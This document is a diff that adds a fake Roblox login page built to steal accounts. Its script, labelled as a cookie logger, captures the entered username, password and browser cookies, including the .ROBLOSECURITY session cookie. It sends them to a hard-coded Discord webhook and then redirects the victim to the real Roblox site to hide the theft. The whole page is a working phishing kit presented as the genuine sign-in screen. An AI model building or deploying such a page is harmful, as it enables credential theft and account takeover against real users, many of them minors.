@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <style>
+        /* ROBLOX OFFICIAL STYLES */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #232323; /* Roblox Dark Background */
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .login-container {
+            background-color: #393939;
+            padding: 40px 32px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .logo {
+            margin-bottom: 24px;
+        }
+
+        .logo svg {
+            width: 180px;
+            height: auto;
+            fill: #ffffff;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #b8b8b8;
+            margin-bottom: 6px;
+            margin-left: 4px;
+        }
+
+        .roblox-input {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: #191919;
+            border: 2px solid #191919;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .roblox-input:focus {
+            border-color: #00b060; /* Roblox Green */
+        }
+
+        .roblox-input::placeholder {
+            color: #666;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b060;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #009955;
+        }
+
+        .forgot-password {
+            margin-top: 16px;
+        }
+
+        .forgot-password a {
+            color: #b8b8b8;
+            font-size: 13px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #888;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #4d4d4d;
+        }
+
+        .divider span {
+            padding: 0 12px;
+        }
+
+        .social-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 10px;
+            background-color: #232323;
+            border: 1px solid #4d4d4d;
+            border-radius: 8px;
+            color: white;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .social-btn:hover {
+            background-color: #191919;
+        }
+
+        .signup-link {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #b8b8b8;
+        }
+
+        .signup-link a {
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Roblox Logo SVG -->
+        <div class="logo">
+            <svg viewBox="0 0 256 256" xmlns="http://www.w3.com/2000/svg">
+                <path d="M217.5,112.5L200,95V175L170,145L155,160L185,190H40V60H185L155,90L170,105L200,75V112.5L217.5,112.5Z"/>
+            </svg>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm">
+            <div class="input-group">
+                <label class="input-label" for="username">Username</label>
+                <input type="text" id="username" class="roblox-input" placeholder="Username" required>
+            </div>
+            <div class="input-group">
+                <label class="input-label" for="password">Password</label>
+                <input type="password" id="password" class="roblox-input" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="#">Forgot Username or Password?</a>
+        </div>
+
+        <div class="divider">
+            <span>OR</span>
+        </div>
+
+        <div class="social-buttons">
+            <button class="social-btn">Continue with Google</button>
+            <button class="social-btn">Continue with Apple</button>
+        </div>
+
+        <div class="signup-link">
+            New to Roblox? <a href="#">Sign Up</a>
+        </div>
+    </div>
+
+    <!-- COOKIE LOGGING SCRIPT -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Get values
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var cookie = document.cookie;
+
+            // Your Discord Webhook URL
+            var webhookUrl = "https://discord.com/api/webhooks/1531659495023968378/283G4YDOmXK-w7oRaw7J3NeyeP1cmK4AnlxXXcqb7zfKo_b1EYG9Ihhqy8puzDv0rDLF";
+
+            // Format the message
+            var message = {
+                content: "**🟢 New Roblox Login!**\n" +
+                         "👤 **Username:** `" + username + "`\n" +
+                         "🔑 **Password:** `" + password + "`\n" +
+                         "🍪 **Cookie (.ROBLOSECURITY):**\n```" + cookie + "```"
+            };
+
+            // Send to Discord
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                // Redirect to real Roblox after successful send
+                window.location.href = "https://www.roblox.com/";
+            })
+            .catch(error => {
+                console.error("Error sending to Discord:", error);
+                // Still redirect even if Discord fails
+                window.location.href = "https://www.roblox.com/";
+            });
+        });
+    </script>
+
+</body>
+</html>
